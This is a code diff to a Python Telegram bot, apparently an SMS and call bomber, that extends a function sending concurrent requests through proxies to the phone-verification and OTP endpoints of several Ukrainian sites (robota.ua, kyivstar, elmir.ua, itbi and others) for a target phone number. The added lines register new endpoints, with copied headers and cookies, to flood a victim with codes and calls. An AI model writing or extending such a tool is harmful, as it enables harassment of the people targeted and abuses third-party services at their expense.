@@ -11,7 +11,13 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.utils.exceptions import BotBlocked
 from aiohttp import BasicAuth
-from headers_main import headers_dnipro, headers_citrus, headers_easypay, cookies_citrus, cookies_dnipro, headers_uvape, cookies_uvape, headers_terravape, cookies_terravape, headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota, headers_avtoria, cookies_avtoria
+from headers_main import (
+    headers_dnipro, headers_citrus, headers_easypay, cookies_citrus, cookies_dnipro,
+    headers_uvape, cookies_uvape, headers_terravape, cookies_terravape,
+    headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
+    headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
+    cookies_elmir_call
+)
 import asyncpg
 import config
 import aiohttp
@@ -427,6 +433,9 @@ async def ukr(number):
         send_request_and_log("https://back.trofim.com.ua/api/via-phone-number", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
         send_request_and_log("https://dracula.robota.ua/?q=SendOtpCode", json={"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
         send_request_and_log(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        send_request_and_log("https://elmir.ua/response/load_json.php?type=validate_phone", data={"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, headers=headers_elmir,cookies=cookies_elmir, proxy=proxy, proxy_auth=proxy_auth),
+        send_request_and_log("https://elmir.ua/response/load_json.php?type=validate_phone", data={"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, headers=headers_elmir_call, cookies=cookies_elmir_call, proxy=proxy, proxy_auth=proxy_auth),
+        send_request_and_log(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
     ]
 
     await asyncio.gather(*tasks)
